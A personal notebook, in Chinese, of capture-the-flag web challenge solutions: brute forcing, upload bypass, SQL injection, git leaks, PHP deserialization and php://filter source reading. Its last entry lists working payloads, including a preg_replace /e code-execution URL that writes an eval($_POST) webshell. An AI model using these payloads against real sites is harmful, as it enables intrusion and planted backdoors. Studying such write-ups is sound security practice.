# Note
	
## SCUCTF:
	1. 一款船细的外部题目 200
	无验证码，脚本爆破，有上传点，php上传点绕过
	
	2. 一道入门的代码审计 170
	读源码，md5弱类型绕过，file_put_contents
	备注：// @$_GET['filename']
	
## xctf平台
	```TODO
	web/JS逆向	https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4810	
		ref:	https://st98.github.io/diary/posts/2017-10-25-hacklu-ctf-2017.html```
		
	1. XCTF 4th-CyberEarth
	 id可能有问题,扔到bp里爆破,2333的时候出flag.私以为这种工具流还挺好用...
	 
	 
	2. XCTF 4th-QCTF-2018 NewsCenter
	post型的注入,扔到sqlmap里,--data 'search'跑表, 看infomation_schema 最后有个fl4g列,完事儿
	
	
	3. csaw-ctf-2016-quals
	看到about页面有使用到git, 那么试试有没有git泄露呢?访问/.git/目录,存在泄露,githack工具走起
	审计index.php的源代码,最终采用**代码注入**搞定,
	
	
	4. tinyctf-2014-NaNNaNNaNNaN-Batman
	js代码,有乱码,需要整理一下,写成规范的函数形式,审计正则匹配,看到有长度限制,删除冗余部分,F12的console里调试一下,提交就可以了(其实可以把条件删除2333)


	5. unserialize3
	反序列化, 解出的第一题,orz
	__wakeup()函数是当php进行反序列化操作（unserialize）的时候自动调用该函数
	**__wakeup()方法的绕过:**一个字符串或对象被序列化后，如果其属性被修改，则不会执行__wakeup()函数,在这里就用来可以绕过exit()
	O:5:"test2":1:{s:4:"t"}
	O:5:"Test2":1:{s:4:"test";s:18:"<?php%20phpinfo();?>";}
	ref:	https://www.jianshu.com/p/be6de8511cb9
	ref:	https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/
	
	
	6. RCTF-2015-upload
	你以为是上传,其实是注入...二次注入,此题心态爆炸,搞明白是怎么fuzzing的(8明白)
	第二种方法:	a'+conv(hex((selselectect mid((selselectect database()),1,6))),16,10)+'a.jpg
	主要涉及conv函数,是convert-进制转换的意思
	ref:	http://morecoder.com/article/1227148.html
	ref:	https://blog.csdn.net/niexinming/article/details/49888893


	7. XCTF 4th-CyberEarth  ics-04 
	```工控云管理系统新添加的登录和注册页面存在漏洞，请找出flag。```
	找到忘记密码界面,丢到bp里爆用户名,得到俩很可疑的	'or''='    admin'or''=' (admin是我刚刚注册的)
	很明显是注入了, 看看有没有注入导致的万能密码. 加入bp爆一下密码,全部失败.
	找了下wp, 结果是在忘记密码输入用户名的界面存在sqli注入.


	8. **XCTF 4th-CyberEarth  ics-05**
		1. 进到index.php里面, 发现page参数可更改,而且会显示在页面中,看题意跟跟xss应该没关系
		看wp说是*php伪协议*,即 php://   ,可用filter查看源码
		/index.php?page=php://filter/read=convert.base64-encode/resource=
		通读源码,大概意思:当x-forwarded-for为环回地址127时,进入管理页面.果断改包绕过
		好了,然后是一个preg_replace正则替换, 想到/e 可以rce, 那么开动:
		```在preg_replace(src,*dst*,STR)中, 如果src中存在 /e 修正符(如/abc/e  不明白为啥要有'/'的同学
		可以去看看php里的正则用法), 把其当做php执行, 我们就在dst 参数里放要执行的PHP 代码```
		
		2. 有了rce, 下一步是找flag, 写入一句话, 菜刀连接之后,看到根目录/下面有个奇怪的文件夹,查看源码,稳健
		
		3. *payload*
		-查看源码	/index.php?page=php://filter/read=convert.base64-encode/resource=index.php
		-	X-Forwarded-For:127.0.0.1
		-	/index.php?pat=/uncle/e&rep=phpinfo()&sub=uncleabc 
		-写入一句话	/index.php?pat=/uncle/e&rep=fputs(fopen(index.php,w),%3C?php%20eval($_POST%5B%5Bpass%5D%5D)?%3E);0&sub=uncleabc
		
		
		
		
		
